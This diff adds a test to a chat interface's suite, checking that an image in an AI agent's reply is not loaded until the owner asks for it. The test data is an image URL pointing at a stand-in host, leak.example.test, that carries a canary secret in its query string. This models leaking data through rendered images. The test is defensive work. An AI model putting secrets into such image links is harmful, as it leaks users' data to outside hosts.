@@ -1275,6 +1275,15 @@ describe("HivraChat", () => {
     expect(link).toHaveAttribute("rel", expect.stringContaining("noopener"));
   });
 
+  it("keeps an image in an agent reply from loading until the owner asks for it", () => {
+    const Image = CHAT_MARKDOWN_COMPONENTS.img;
+    const { container } = render(
+      <div><Image src="https://leak.example.test/pixel.png?d=CANARY-SECRET" alt="chart" /></div>,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("button", { name: /chart/ })).toHaveTextContent("leak.example.test");
+  });
+
   it("runs several chats at once and routes each stream to the chat that started it", async () => {
     (listBoxSessions as jest.Mock).mockResolvedValue([
       { id: "existing", title: "Existing session", updatedAt: 1 },
